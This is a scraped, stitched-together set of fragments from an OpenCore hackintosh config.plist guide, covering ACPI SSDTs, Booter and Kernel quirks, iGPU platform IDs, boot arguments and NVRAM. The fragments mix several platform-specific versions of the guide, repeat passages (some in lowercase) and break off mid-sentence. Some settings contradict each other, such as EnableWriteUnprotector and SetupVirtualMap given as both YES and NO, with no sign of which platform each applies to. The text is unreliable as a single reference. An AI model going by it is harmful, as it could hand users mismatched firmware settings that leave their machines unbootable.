Most laptops have garbage firmwares so we'll need this as well\n\n * DisableSecurityPolicy: NO\n   \n   * Disables platform security policy in firmware, recommended for buggy firmwares where disabling Secure Boot does not allow 3rd party firmware drivers to load.\n   * If running a Microsoft Surface device, recommended to enable this option\n\n * RequestBootVarRouting: YES\n   \n   * Redirects AptioMemoryFix from EFI_GLOBAL_VARIABLE_GUID to OC_VENDOR_VARIABLE_GUID. Needed for when firmware tries to delete boot entries and is recommended to be enabled on all systems for correct update installation, Startup Disk control panel functioning, etc.\n\n * UnblockFsConnect: NO\n   \n   * Some firmware block partition handles by opening them in By Driver mode, which results in File System protocols being unable to install. Mainly relevant for HP systems when no drives are listed\n\n\n# ReservedMemory\n\nUsed for exempting certain memory regions from OSes to use, mainly relevant for Sandy Bridge iGPUs or systems with faulty memory.

tell you how to configure everything, you won't be left in the cold. this also means if you have issues, review your config settings to make sure they're correct. main things to note with opencore:\n\n * all properties must be defined, there are no default opencore will fall back on so do not delete sections unless told explicitly so. if the guide doesn't mention the option, leave it at default.\n * the sample.plist cannot be used as-is, you must configure it to your system\n * do not use configurators, these rarely respect opencore's configuration and even some like mackie's will add clover properties and corrupt plists!\n\nnow with all that, a quick reminder of the tools we need\n\n * propertree\n   * universal plist editor\n * gensmbios\n   * for generating our smbios data\n * sample/config.plist\n   * see previous section on how to obtain: config.plist setup\n\nwarning\n\nread this guide more than once before setting up opencore and make sure you have it set up

guide and is used for setting important igpu properties.\n\nthe config.plist doesn't already have a section for this so you will have to create it manually.\n\nwhen setting up your igpu, the table below should help with finding the right values to set. here is an explanation of some values:\n\n * aapl,ig-platform-id\n   * this is used internally for setting up the igpu\n * type\n   * whether the entry is recommended for laptops(ie. with built-in displays) or for intel nucs(ie. stand alone boxes)\n\ngenerally follow these steps when setting up your igpu properties. follow the configuration notes below the table if they say anything different:\n\n 1. when initially setting up your config.plist, only set aapl,ig-platform-id - this is normally enough\n 2. if you boot and you get no graphics acceleration (7mb vram and solid background for dock), then you likely need to try different aapl,ig-platform-id values, add stolenmem patches, or even add a device-id property.\n\naapl,ig-platform-id   type     comment\n0500260a              laptop   to be used usually with hd 5000, hd 5100 and hd 5200\n0600260a              laptop   to be used usually with hd

performance without keepsyms=1\n * disablertcchecksum: no\n   * prevents applertc from writing to primary checksum (0x58-0x59), required for users who either receive bios reset or are sent into safe mode after reboot/shutdown\n * extendbtfeatureflags no\n   * helpful for those having continuity issues with non-apple/non-fenvi cards\n * lapickernelpanic: no\n   * disables kernel panic on ap core lapic interrupt, generally needed for hp systems. clover equivalent is kernel lapic\n * legacycommpage: no\n   * resolves ssse3 requirement for 64 bit cpus in macos, mainly relevant for 64-bit pentium 4 cpus(ie. prescott)\n * panicnokextdump: yes\n   * allows for reading kernel panics logs when kernel panics occur\n * powertimeoutkernelpanic: yes\n   * helps fix kernel panics relating to power changes with apple drivers in macos catalina, most notably with digital audio.\n * setapfstrimtimeout: -1\n   * sets trim timeout in microseconds for apfs filesystems on ssds, only applicable for macos 10.14 and newer with problematic ssds.\n * xhciportlimit: yes\n   * this is actually the 15 port limit patch, don't rely on it as it's not a guaranteed solution for fixing usb. please create a usb map when possible.\n   * with macos 11.3+, xhciportlimit may not function as intended. we recommend users either disable this quirk and map before upgrading or map from windows. you may also install macos 11.2.3 or older.\n\nthe reason being is that usbinjectall reimplements builtin macos functionality without proper current tuning. it is much cleaner to just describe your ports in a single plist-only kext, which will not waste runtime memory and such\n\n\n# scheme\n\nsettings related to legacy booting(ie. 10.4-10.6), for majority you can skip however for those planning to boot legacy oses you can see below:\n\nmore in-depth info\n\n * fuzzymatch: true\n   \n   * used for ignoring checksums with kernelcache, instead opting for the latest cache available. can help improve boot performance on many machines in 10.6\n\n * kernelarch: x86_64\n   \n   * set the kernel's arch type, you can choose between auto, i386 (32-bit), and x86_64 (64-bit).\n   * if you're booting older oses which require a 32-bit kernel(ie. 10.4 and 10.5) we recommend to set this to auto and let macos decide based on your smbios. see below table for supported values:\n     * 10.4-10.5 — x86_64, i386 or i386-user32\n       * i386-user32 refers 32-bit userspace, so 32-bit cpus must use this(or cpus missing ssse3)\n       * x86_64 will still have a 32-bit kernelspace however will ensure 64-bit userspace in 10.4/5\n     * 10.6 — i386, i386-user32, or x86_64\n     * 10.7 — i386 or x86_64\n     * 10.8 or newer — x86_64\n\n * kernelcache: auto\n   \n   * set kernel cache type, mainly useful for debugging and so we recommend auto for best support\n\n\n# misc\n\n\n\n\n# boot\n\ninfo\n\nquirk           enabled   comment\nhideauxiliary   yes       press space to show macos recovery and other

                 is case-sensitive\n\nmore in-depth info\n\n * allowsetdefault: yes\n   \n   * allow ctrl+enter and ctrl+index to set default boot device in the picker\n\n * apecid: 0\n   \n   * used for netting personalized secure-boot identifiers, currently this quirk is unreliable due to a bug in the macos installer so we highly encourage you to leave this as default.\n\n * authrestart: no\n   \n   * enables authenticated restart for filevault 2 so password is not required on reboot. can be considered a security risk so optional\n\n * blacklistappleupdate: yes\n   \n   * used for blocking firmware updates, used as extra level of protection as macos big sur no longer uses run-efi-updater variable\n\n * dmgloading: signed\n   \n   * ensures only signed dmgs load\n\n * exposesensitivedata: 6\n   \n   * shows more debug information, requires debug version of opencore\n\n * vault: optional\n   \n   * we won't be dealing vaulting so we can ignore, you won't boot with this set to secure\n   * this is a word, it is not optional to omit this setting. you will regret it if you don't set it to optional, note that it is case-sensitive\n\n * scanpolicy: 0\n   \n   * 0

booting\n              instead of the apple logo and progress bar. it's invaluable\n              to any hackintosher, as it gives you an inside look at the\n              boot process, and can help you identify issues, problem\n              kexts, etc.\ndebug=0x100   this disables macos's watchdog which helps prevents a reboot\n              on a kernel panic. that way you can hopefully glean some\n              useful info and follow the breadcrumbs to get past the\n              issues.\nkeepsyms=1    this is a companion setting to debug=0x100 that tells the os\n              to also print the symbols on a kernel panic. that can give\n              some more helpful insight as to what's causing the panic\n              itself.\nalcid=1       used for setting layout-id for applealc, see supported\n              codecs to figure out which layout to use for your specific\n              system. more info on this is covered in the post-install\n              page\n\n *

         macos where their dgpu isn't supported\n\n * csr-active-config: 00000000\n   \n   * settings for 'system integrity protection' (sip). it is generally recommended to change this with csrutil via the recovery partition.\n   * csr-active-config by default is set to 00000000 which enables system integrity protection. you can choose a number of different values but overall we recommend keeping this enabled for best security practices. more info can be found in our troubleshooting page: disabling sip\n\n * run-efi-updater: no\n   \n   * this is used to prevent apple's firmware update packages from installing and breaking boot order; this is important as these firmware updates (meant for macs) will not work.\n\n * prev-lang:kbd: <>\n   \n   * needed for non-latin keyboards in the format of lang-country:keyboard, recommended to keep blank though you can specify it(default in sample config is russian):\n   * american: en-us:0(656e2d55533a30 in hex)\n   * full list can be found in applekeyboardlayouts.txt\n   * hint: prev-lang:kbd can be changed into a string so you can input en-us:0 directly instead of converting to hex\n   * hint 2: prev-lang:kbd can be set to a blank variable (eg. <>) which will force the language picker to appear instead at first boot up.\n\nkey             type     value\nprev-lang:kbd   string   en-us:0\n\n\n# delete\n\nforcibly rewrites nvram

config.plist may seem hard, it's not. It just takes some time but this guide will tell you how to configure everything, you won't be left in the cold. This also means if you have issues, review your config settings to make sure they're correct. Main things to note with OpenCore:\n\n * All properties must be defined, there are no default OpenCore will fall back on so do not delete sections unless told explicitly so. If the guide doesn't mention the option, leave it at default.\n * The Sample.plist cannot be used As-Is, you must configure it to your system\n * DO NOT USE CONFIGURATORS, these rarely respect OpenCore's configuration and even some like Mackie's will add Clover properties and corrupt plists!\n\nNow with all that, a quick reminder of the tools we need\n\n * ProperTree\n   * Universal plist editor\n * GenSMBIOS\n   * For generating our SMBIOS data\n * Sample/config.plist\n   * See previous section on how to obtain: config.plist Setup\n\nWARNING\n\nRead this guide more than once before setting up OpenCore and make sure you have it set up correctly. Do note that images will not always be the most up-to-date so please read the text below them, if nothing's mentioned then leave as default.\n\n\n# ACPI\n\n\n\n\n# Add\n\nInfo\n\nThis is where you'll add SSDTs for your system, these are very important to booting macOS and have many uses like USB maps, disabling unsupported GPUs and such. And with our system, it's even required to boot. Guide on making them found here: Getting started with ACPI\n\nFor us we'll need a couple of SSDTs to bring back functionality that Clover provided:\n\nREQUIRED SSDTS   DESCRIPTION\nSSDT-PLUG        Allows for native CPU power management on Haswell and newer,\n                 see Getting Started With ACPI Guide for more details.\nSSDT-EC-USBX     Fixes both the embedded controller and USB power, see\n                 Getting Started With ACPI Guide for more details.\nSSDT-GPIO        Creates a stub so VoodooI2C can connect, for those having\n                 troubles getting VoodooI2C working can try SSDT-XOSI\n                 instead. Note that Intel NUCs do not need this\nSSDT-PNLF        Fixes brightness control, see Getting Started With ACPI\n                 Guide for more details. Note that Intel NUCs do not need\n                 this\nSSDT-AWAC        This is the 300 series RTC patch, required for most B360,\n                 B365, H310, H370, Z390 and some Z370 boards which prevent\n                 systems from booting macOS. The alternative is SSDT-RTC0 for\n                 when AWAC SSDT is incompatible due to missing the Legacy RTC\n                 clock, to check whether you need it and which to use please\n                 see Getting started with ACPI page.\nSSDT-RHUB        Needed to fix Root-device errors on many Icelake laptops\n\nNote that you should not add your generated DSDT.aml here, it is already in your firmware. So if present, remove the entry for it in your config.plist and under EFI/OC/ACPI.\n\nFor those wanting a deeper dive into dumping your DSDT, how to make these SSDTs, and compiling them, please see the Getting started with ACPI page. Compiled SSDTs have a .aml extension(Assembled) and will go into the EFI/OC/ACPI folder and must be specified in your config under ACPI -> Add as well.\n\n\n# Delete\n\nThis blocks certain ACPI tables from loading, for us we can ignore this.\n\n\n# Patch\n\nInfo\n\nThis section allows us to dynamically modify parts of the ACPI (DSDT, SSDT, etc.) via OpenCore. For us, we'll need the following:\n\n * OSI rename\n   * This is required when using SSDT-XOSI as we redirect all OSI calls to this SSDT, this is not needed if you're using SSDT-GPIO\n\nCOMMENT   STRING    CHANGE _OSI TO XOSI\nEnabled   Boolean   YES\nCount     Number    0\nLimit     Number    0\nFind      Data      5f4f5349\nReplace   Data      584f5349\n\n\n# Quirks\n\nSettings relating to ACPI, leave everything here as default as we have no use for these quirks.\n\n\n# Booter\n\n\n\nThis section is dedicated to quirks relating to boot.efi patching with OpenRuntime, the replacement for AptioMemoryFix.efi\n\n\n# MmioWhitelist\n\nThis section is allowing devices to be pass-through to macOS that are generally ignored, for us we can ignore this section.\n\n\n# Quirks\n\nInfo\n\nSettings relating to boot.efi patching and firmware fixes, for us, we need to change the following:\n\nQUIRK                    ENABLED   COMMENT\nDevirtualiseMmio         YES\nEnableWriteUnprotector   NO\nProtectMemoryRegions     YES\n\nProtectUefiServices      YES\nRebuildAppleMemoryMap    YES\nSetupVirtualMap          NO\nSyncRuntimePermissions   YES\n\nMore in-depth Info\n * AvoidRuntimeDefrag: YES\n   * Fixes UEFI runtime services like date, time, NVRAM, power control, etc\n * DevirtualiseMmio: YES\n   * Reduces Stolen Memory Footprint, expands options for slide=N values and very helpful with fixing Memory Allocation issues on Z390. Requires ProtectUefiServices as well on IceLake and Z390 Coffee Lake\n * EnableSafeModeSlide: YES\n   * Enables slide variables to be used in safe mode.\n * EnableWriteUnprotector: NO\n   * This quirk and RebuildAppleMemoryMap can commonly conflict, recommended to enable the latter on newer platforms and disable this entry.\n   * However, due to issues with OEMs not using the latest EDKII builds you may find that the above combo will result in early boot failures. This is due to missing the MEMORY_ATTRIBUTE_TABLE and such we recommend disabling RebuildAppleMemoryMap and enabling EnableWriteUnprotector. More info on this is covered in the troubleshooting section\n * ProtectMemoryRegions: YES\n   * Patches memory region types for incorrectly mapped CSM/MMIO regions. Necessary for all Chromebooks that utilize coreboot UEFI firmware.\n * ProtectUefiServices: YES\n   * Protects UEFI services from being overridden by the firmware, mainly relevant for VMs, Icelake and Z390 systems'\n   * If on Z390, enable this quirk\n * ProvideCustomSlide: YES\n   * Used for Slide variable calculation. However the necessity of this quirk is determined by OCABC: Only N/256 slide values are usable! message in the debug log. If the message OCABC: All slides are usable! You can disable ProvideCustomSlide! is present in your log, you can disable ProvideCustomSlide.\n * RebuildAppleMemoryMap: YES\n   * Generates Memory Map compatible with macOS, can break on some laptop OEM firmwares so if you receive early boot failures disable this\n * SetupVirtualMap: NO\n   * Fixes SetVirtualAddresses calls to virtual addresses, can cause early kernel panics on Ice Lake machines\n * SyncRuntimePermissions: YES\n   * Fixes alignment with MAT tables and required to boot Windows and Linux with MAT tables, also recommended for macOS. Mainly relevant for RebuildAppleMemoryMap users\n\n\n# DeviceProperties\n\n\n\n\n# Add\n\nSets device properties from a map.\n\nPciRoot(0x0)/Pci(0x2,0x0)\n\nThis section is set up via WhateverGreen's Framebuffer Patching Guide and is used for setting important iGPU properties.\n\nThe config.plist doesn't already have a section for this so you will have to create it manually.\n\nWhen setting up your iGPU, the table below should help with finding the right values to set. Here is an explanation of some values:\n\n * AAPL,ig-platform-id\n   * This is used internally for setting up the iGPU\n * Port Count\n   * The number of displays supported\n\nGenerally follow these steps when setting up your iGPU properties. Follow the configuration notes below the table if they say anything different:\n\n 1. When initially setting up your config.plist, only set AAPL,ig-platform-id - this is normally enough\n 2. If you boot and you get no graphics acceleration (7MB VRAM and solid background for dock), then you likely need to try different AAPL,ig-platform-id values, add stolenmem patches, or even add a device-id property.\n\nAAPL,IG-PLATFORM-ID   PORT COUNT   COMMENT\n0000528A              6            Recommended G4/G7 value\n\n# Configuration Notes\n\n * In some cases where you cannot set the DVMT-prealloc of these cards to 256MB higher in your UEFI Setup, you may get a kernel panic. Usually they're configured for 32MB of DVMT-prealloc, in that case these values are added to your iGPU Properties\n\nKEY                        TYPE     VALUE\nframebuffer-patch-enable   Number   1\nframebuffer-stolenmem      Data     00003001\nframebuffer-fbmem          Data     00009000\n\nPciRoot(0x0)/Pci(0x1b,0x0)\n\nlayout-id\n\n * Applies AppleALC audio injection, you'll need to do your own research on which codec your motherboard has and match it with AppleALC's layout. AppleALC Supported Codecs.\n * You can delete this property outright as it's unused for us at this time\n\nFor us, we'll be using the boot argument alcid=xxx instead to accomplish this. alcid will override all other layout-IDs present.

By default we recommend leaving what ProperTree has done, however for 32-bit CPUs please see below:\n\nMore in-depth Info\n\nThe main thing you need to keep in mind is:\n\n * Load order\n   * Remember that any plugins should load after its dependencies\n   * This means kexts like Lilu must come before VirtualSMC, AppleALC, WhateverGreen, etc\n\nA reminder that ProperTree users can run Cmd/Ctrl + Shift + R to add all their kexts in the correct order without manually typing each kext out.\n\n * Arch\n   * Architectures supported by this kext\n   * Currently supported values are Any, i386 (32-bit), and x86_64 (64-bit)\n * BundlePath\n   * Name of the kext\n   * ex: Lilu.kext\n * Enabled\n   * Self-explanatory, either enables or disables the kext\n * ExecutablePath\n   * Path to the actual executable is hidden within the kext, you can see what path your kext has by right-clicking and selecting Show Package Contents. Generally, they'll be Contents/MacOS/Kext but some have kexts hidden within under Plugin folder. Do note that plist only kexts do not need this filled in.\n   * ex: Contents/MacOS/Lilu\n * MinKernel\n   * Lowest kernel version your kext will be injected into, see below table for possible values\n   * ex. 12.00.00 for OS X 10.8\n * MaxKernel\n   * Highest kernel version your kext will be injected into, see below table for possible values\n   * ex. 11.99.99 for OS X 10.7\n * PlistPath\n   * Path to the info.plist hidden within the kext\n   * ex: Contents/Info.plist\n\nKernel Support Table\n\nOS X VERSION   MINKERNEL   MAXKERNEL\n10.4           8.0.0       8.99.99\n10.5           9.0.0       9.99.99\n10.6           10.0.0      10.99.99\n10.7           11.0.0      11.99.99\n10.8           12.0.0      12.99.99\n10.9           13.0.0      13.99.99\n10.10          14.0.0      14.99.99\n10.11          15.0.0      15.99.99\n10.12          16.0.0      16.99.99\n10.13          17.0.0      17.99.99\n10.14          18.0.0      18.99.99\n10.15          19.0.0      19.99.99\n11             20.0.0      20.99.99\n12             21.0.0      21.99.99\n13             22.0.0      22.99.99\n\n\n# Emulate\n\nNeeded for spoofing unsupported CPUs like Pentiums and Celerons\n\n * Cpuid1Mask: Leave this blank\n * Cpuid1Data: Leave this blank\n\n\n# Force\n\nUsed for loading kexts off system volume, only relevant for older operating systems where certain kexts are not present in the cache(ie.

Usually relevant for Dell laptops\n   * Enabling this quirk with UpdateSMBIOSMode Custom mode can also disable SMBIOS injection into \"non-Apple\" OSes however we do not endorse this method as it breaks Bootcamp compatibility. Use at your own risk\n * DisableIoMapper: YES\n   * Needed to get around VT-D if either unable to disable in BIOS or needed for other operating systems, much better alternative to dart=0 as SIP can stay on in Catalina\n * DisableLinkeditJettison: YES\n   * Allows Lilu and others to have more reliable performance without keepsyms=1\n * DisableRtcChecksum: NO\n   * Prevents AppleRTC from writing to primary checksum (0x58-0x59), required for users who either receive BIOS reset or are sent into Safe mode after reboot/shutdown\n * ExtendBTFeatureFlags NO\n   * Helpful for those having continuity issues with non-Apple/non-Fenvi cards\n * LapicKernelPanic: NO\n   * Disables kernel panic on AP core lapic interrupt, generally needed for HP systems. Clover equivalent is Kernel LAPIC\n * LegacyCommpage: NO\n   * Resolves SSSE3 requirement for 64 Bit CPUs in macOS, mainly relevant for 64-Bit Pentium 4 CPUs(ie. Prescott)\n * PanicNoKextDump: YES\n   * Allows for reading kernel panics logs when kernel panics occur\n * PowerTimeoutKernelPanic: YES\n   * Helps fix kernel panics relating to power changes with Apple drivers in macOS Catalina, most notably with digital audio.\n * SetApfsTrimTimeout: -1\n   * Sets trim timeout in microseconds for APFS filesystems on SSDs, only applicable for macOS 10.14 and newer with problematic SSDs.\n * XhciPortLimit: YES\n   * This is actually the 15 port limit patch, don't rely on it as it's not a guaranteed solution for fixing USB. Please create a USB map when possible.\n   * With macOS 11.3+, XhciPortLimit may not function as intended. We recommend users either disable this quirk and map before upgrading or map from Windows. You may also install macOS 11.2.3 or older.\n\nThe reason being is that UsbInjectAll reimplements builtin macOS functionality without proper current tuning. It is much cleaner to just describe your ports in a single plist-only kext, which will not waste runtime memory and such\n\n\n# Scheme\n\nSettings related to legacy booting(ie. 10.4-10.6), for majority you can skip however for those planning to boot legacy OSes you can see below:\n\nMore in-depth Info\n\n * FuzzyMatch: True\n   \n   * Used for ignoring checksums with kernelcache, instead opting for the latest cache available. Can help improve boot performance on many machines in 10.6\n\n * KernelArch: x86_64\n   \n   * Set the kernel's arch type, you can choose between Auto, i386 (32-bit), and x86_64 (64-bit).\n   * If you're booting older OSes which require a 32-bit kernel(ie. 10.4 and 10.5) we recommend to set this to Auto and let macOS decide based on your SMBIOS. See below table for supported values:\n     * 10.4-10.5 — x86_64, i386 or i386-user32\n       * i386-user32 refers 32-bit userspace, so 32-bit CPUs must use this(or CPUs missing SSSE3)\n       * x86_64 will still have a 32-bit kernelspace however will ensure 64-bit userspace in 10.4/5\n     * 10.6 — i386, i386-user32, or x86_64\n     * 10.7 — i386 or x86_64\n     * 10.8 or newer — x86_64\n\n * KernelCache: Auto\n   \n   * Set kernel cache type, mainly useful for debugging and so we recommend Auto for best support\n\n\n# Misc\n\n\n\n\n# Boot\n\nInfo\n\nQUIRK           ENABLED   COMMENT\nHideAuxiliary   YES       Press space to show macOS recovery and other auxiliary\n                          entries\n\nMore in-depth Info\n * HideAuxiliary: YES\n   * This option will hide supplementary entries, such as macOS recovery and tools, in the picker.

this is actually the 15 port limit patch, don't rely on it as it's not a guaranteed solution for fixing usb. please create a usb map when possible.\n   * with macos 11.3+, xhciportlimit may not function as intended. we recommend users either disable this quirk and map before upgrading or map from windows. you may also install macos 11.2.3 or older.\n\nthe reason being is that usbinjectall reimplements builtin macos functionality without proper current tuning. it is much cleaner to just describe your ports in a single plist-only kext, which will not waste runtime memory and such\n\n\n# scheme\n\nsettings related to legacy booting(ie. 10.4-10.6), for majority you can skip however for those planning to boot legacy oses you can see below:\n\nmore in-depth info\n\n * fuzzymatch: true\n   \n   * used for ignoring checksums with kernelcache, instead opting for the latest cache available. can help improve boot performance on many machines in 10.6\n\n * kernelarch: x86_64\n   \n   * set the kernel's arch type, you can choose between auto, i386 (32-bit), and x86_64 (64-bit).\n   * if you're booting older oses which require a 32-bit kernel(ie. 10.4 and 10.5) we recommend to set this to auto and let macos decide based on your smbios. see below table for supported values:\n     * 10.4-10.5 — x86_64, i386 or i386-user32\n       * i386-user32 refers 32-bit userspace, so 32-bit cpus must use this(or cpus missing ssse3)\n       * x86_64 will still have a 32-bit kernelspace however will ensure 64-bit userspace in 10.4/5\n     * 10.6 — i386, i386-user32, or x86_64\n     * 10.7 — i386 or x86_64\n     * 10.8 or newer — x86_64\n\n * kernelcache: auto\n   \n   * set kernel cache type, mainly useful for debugging and so we recommend auto for best support\n\n\n# misc\n\n\n\n\n#

instead of the apple logo and progress bar. it's invaluable\n              to any hackintosher, as it gives you an inside look at the\n              boot process, and can help you identify issues, problem\n              kexts, etc.\ndebug=0x100   this disables macos's watchdog which helps prevents a reboot\n              on a kernel panic. that way you can hopefully glean some\n              useful info and follow the breadcrumbs to get past the\n              issues.\nkeepsyms=1    this is a companion setting to debug=0x100 that tells the os\n              to also print the symbols on a kernel panic. that can give\n              some more helpful insight as to what's causing the panic\n              itself.\nalcid=1       used for setting layout-id for applealc, see supported\n

igpu telemetry may\n                       cause a freeze during startup on certain laptops such as\n                       chromebooks on macos 10.15 and higher, see here for more\n                       information.\n\n * csr-active-config: 00000000\n   \n   * settings for 'system integrity protection' (sip). it is generally recommended to change this with csrutil via the recovery partition.\n   * csr-active-config by default is set to 00000000 which enables system integrity protection. you can choose a number of different values but overall we recommend keeping this enabled for best security practices. more info can be found in our troubleshooting page: disabling sip\n\n * run-efi-updater: no\n   \n   * this is used to prevent apple's firmware update packages from installing and breaking boot order; this is important as these firmware updates (meant for macs) will not work.\n\n * prev-lang:kbd: <>\n   \n   * needed for non-latin keyboards in the format of lang-country:keyboard,

Starting Point\n\nSo making a config.plist may seem hard, it's not. It just takes some time but this guide will tell you how to configure everything, you won't be left in the cold. This also means if you have issues, review your config settings to make sure they're correct. Main things to note with OpenCore:\n\n * All properties must be defined, there are no default OpenCore will fall back on so do not delete sections unless told explicitly so. If the guide doesn't mention the option, leave it at default.\n * The Sample.plist cannot be used As-Is, you must configure it to your system\n * DO NOT USE CONFIGURATORS, these rarely respect OpenCore's configuration and even some like Mackie's will add Clover properties and corrupt plists!\n\nNow with all that, a quick reminder of the tools we need\n\n * ProperTree\n   * Universal plist editor\n * GenSMBIOS\n   * For generating our SMBIOS data\n * Sample/config.plist\n   * See previous section on how to obtain: config.plist Setup\n\nWARNING\n\nRead this guide more than once before setting up OpenCore and make sure you have it set up correctly. Do note that images will not always be the most up-to-date so please read the text below them, if nothing's mentioned then leave as default.\n\n\n# ACPI\n\n\n\n\n# Add\n\nInfo\n\nThis is where you'll add SSDTs for your system, these are very important to booting macOS and have many uses like USB maps, disabling unsupported GPUs and such. And with our system, it's even required to boot. Guide on making them found here: Getting started with ACPI\n\nFor us we'll need a couple of SSDTs to bring back functionality that Clover provided:\n\nREQUIRED SSDTS   DESCRIPTION\nSSDT-PM          Needed for proper CPU power management, you will need to run\n                 Pike's ssdtPRGen.sh script to generate this file. This will\n                 be run in post install.\nSSDT-EC          Fixes the embedded controller, see Getting Started With ACPI\n                 Guide for more details.\nSSDT-XOSI        Makes all _OSI calls specific to Windows work for macOS\n                 (Darwin) Identifier. This may help enabling some features\n                 like XHCI and others.\nSSDT-PNLF        Fixes brightness control, see Getting Started With ACPI\n                 Guide for more details. Note that Intel NUCs do not need\n                 this\nSSDT-IMEI        Needed to add a missing IMEI device on Ivy Bridge CPU with 6\n                 series motherboards, not needed for 7 series motherboards\n\nNote that you should not add your generated DSDT.aml here, it is already in your firmware. So if present, remove the entry for it in your config.plist and under EFI/OC/ACPI.\n\nFor those wanting a deeper dive into dumping your DSDT, how to make these SSDTs, and compiling them, please see the Getting started with ACPI page. Compiled SSDTs have a .aml extension(Assembled) and will go into the EFI/OC/ACPI folder and must be specified in your config under ACPI -> Add as well.\n\n\n# Delete\n\nInfo\n\nThis blocks certain ACPI tables from loading, for us we really care about this. Main reason is that Apple's XCPM does not support IvyBridge all too well and can cause AppleIntelCPUPowerManagement panics on boot. To avoid this we make our own PM SSDT in Post-Install and drop the old tables(Note that this is only temporary until we've made our SSDT-PM, we'll re-enable these tables later):\n\nRemoving CpuPm:\n\nKEY              TYPE      VALUE\nAll              Boolean   YES\nComment          String    Delete CpuPm\nEnabled          Boolean   YES\nOemTableId       Data      437075506d000000\nTableLength      Number    0\nTableSignature   Data      53534454\n\nRemoving Cpu0Ist:\n\nKEY              TYPE      VALUE\nAll              Boolean   YES\nComment          String    Delete Cpu0Ist\nEnabled          Boolean   YES\nOemTableId       Data      4370753049737400\nTableLength      Number    0\nTableSignature   Data      53534454\n\n\n# Patch\n\nInfo\n\nThis section allows us to dynamically modify parts of the ACPI (DSDT, SSDT, etc.) via OpenCore. For us, we'll need the following:\n\n * OSI rename\n   * This is required when using SSDT-XOSI as we redirect all OSI calls to this SSDT\n\nCOMMENT   STRING    CHANGE _OSI TO XOSI\nEnabled   Boolean   YES\nCount     Number    0\nLimit     Number    0\nFind      Data      5f4f5349\nReplace   Data      584f5349\n\n\n# Quirks\n\nSettings relating to ACPI, leave everything here as default as we have no use for these quirks.\n\n\n# Booter\n\n\n\nThis section is dedicated to quirks relating to boot.efi patching with OpenRuntime, the replacement for AptioMemoryFix.efi\n\n\n# MmioWhitelist\n\nThis section is allowing spaces to be pass-through to macOS that are generally ignored, useful when paired with DevirtualiseMmio\n\n\n# Quirks\n\nInfo\n\nSettings relating to boot.efi patching and firmware fixes, for us, we leave it as default\n\nMore in-depth Info\n * AvoidRuntimeDefrag: YES\n   * Fixes UEFI runtime services like date, time, NVRAM, power control, etc\n * EnableSafeModeSlide: YES\n   * Enables slide variables to be used in safe mode.\n * EnableWriteUnprotector: YES\n   * Needed to remove write protection from CR0 register.\n * ProvideCustomSlide: YES\n   * Used for Slide variable calculation. However the necessity of this quirk is determined by OCABC: Only N/256 slide values are usable! message in the debug log. If the message OCABC: All slides are usable! You can disable ProvideCustomSlide! is present in your log, you can disable ProvideCustomSlide.\n * SetupVirtualMap: YES\n   * Fixes SetVirtualAddresses calls to virtual addresses, required for Gigabyte boards to resolve early kernel panics\n\n\n# DeviceProperties\n\n\n\n\n# Add\n\nSets device properties from a map.\n\nPciRoot(0x0)/Pci(0x2,0x0)\n\nThis section is set up via WhateverGreen's Framebuffer Patching Guide and is used for setting important iGPU properties.\n\nThe config.plist doesn't already have a section for this so you will have to create it manually.\n\nWhen setting up your iGPU, the table below should help with finding the right values to set. Here is an explanation of some values:\n\n * AAPL,ig-platform-id\n   * This is used internally for setting up the iGPU\n * Type\n   * Whether the entry is recommended for laptops(ie. with built-in displays) or for Intel NUCs(ie. stand alone boxes)\n\nGenerally follow these steps when setting up your iGPU properties. Follow the configuration notes below the table if they say anything different:\n\n 1. When initially setting up your config.plist, only set AAPL,ig-platform-id - this is normally enough\n 2. If you boot and you get no graphics acceleration (7MB VRAM and solid background for dock), then you likely need to try different AAPL,ig-platform-id values, add stolenmem patches, or even add a device-id property.\n\nAAPL,IG-PLATFORM-ID   TYPE     COMMENT\n03006601              Laptop   To be used with 1366 by 768 displays or lower\n04006601              Laptop   To be used with 1600 by 900 displays or higher, see below\n                               for addition patches\n09006601              Laptop   To be used with some devices that have eDP connected monitor\n                               (contrary to classical LVDS), must be tested with 03006601\n                               and 04006601 first before trying this.\n0B006601              NUC      To be used with Intel NUCs\n\n# Configuration Notes\n\n * VGA is not supported (unless it's running through a DP to VGA internal adapter, which apparently only rare devices will see it as DP and not VGA, it's all about luck.)\n\n * If you're using 04006601 as your ig-platform-id, you may need to add the following parameters to fix external outputs as otherwise you will only have one output.

Usually relevant for Dell laptops\n   * Enabling this quirk with UpdateSMBIOSMode Custom mode can also disable SMBIOS injection into \"non-Apple\" OSes however we do not endorse this method as it breaks Bootcamp compatibility. Use at your own risk\n * DisableIoMapper: YES\n   * Needed to get around VT-D if either unable to disable in BIOS or needed for other operating systems, much better alternative to dart=0 as SIP can stay on in Catalina\n * DisableLinkeditJettison: YES\n   * Allows Lilu and others to have more reliable performance without keepsyms=1\n * DisableRtcChecksum: NO\n   * Prevents AppleRTC from writing to primary checksum (0x58-0x59), required for users who either receive BIOS reset or are sent into Safe mode after reboot/shutdown\n * ExtendBTFeatureFlags NO\n   * Helpful for those having continuity issues with non-Apple/non-Fenvi cards\n * LapicKernelPanic: NO\n   * Disables kernel panic on AP core lapic interrupt, generally needed for HP systems. Clover equivalent is Kernel LAPIC\n * LegacyCommpage: NO\n   * Resolves SSSE3 requirement for 64 Bit CPUs in macOS, mainly relevant for 64-Bit Pentium 4 CPUs(ie. Prescott)\n * PanicNoKextDump: YES\n   * Allows for reading kernel panics logs when kernel panics occur\n * PowerTimeoutKernelPanic: YES\n   * Helps fix kernel panics relating to power changes with Apple drivers in macOS Catalina, most notably with digital audio.\n * SetApfsTrimTimeout: -1\n   * Sets trim timeout in microseconds for APFS filesystems on SSDs, only applicable for macOS 10.14 and newer with problematic SSDs.\n * XhciPortLimit: YES\n   * This is actually the 15 port limit patch, don't rely on it as it's not a guaranteed solution for fixing USB. Please create a USB map when possible.\n   * With macOS 11.3+, XhciPortLimit may not function as intended. We recommend users either disable this quirk and map before upgrading or map from Windows. You may also install macOS 11.2.3 or older.\n\nThe reason being is that UsbInjectAll reimplements builtin macOS functionality without proper current tuning. It is much cleaner to just describe your ports in a single plist-only kext, which will not waste runtime memory and such\n\n\n# Scheme\n\nSettings related to legacy booting(ie. 10.4-10.6), for majority you can skip however for those planning to boot legacy OSes you can see below:\n\nMore in-depth Info\n\n * FuzzyMatch: True\n   \n   * Used for ignoring checksums with kernelcache, instead opting for the latest cache available. Can help improve boot performance on many machines in 10.6\n\n * KernelArch: x86_64\n   \n   * Set the kernel's arch type, you can choose between Auto, i386 (32-bit), and x86_64 (64-bit).\n   * If you're booting older OSes which require a 32-bit kernel(ie. 10.4 and 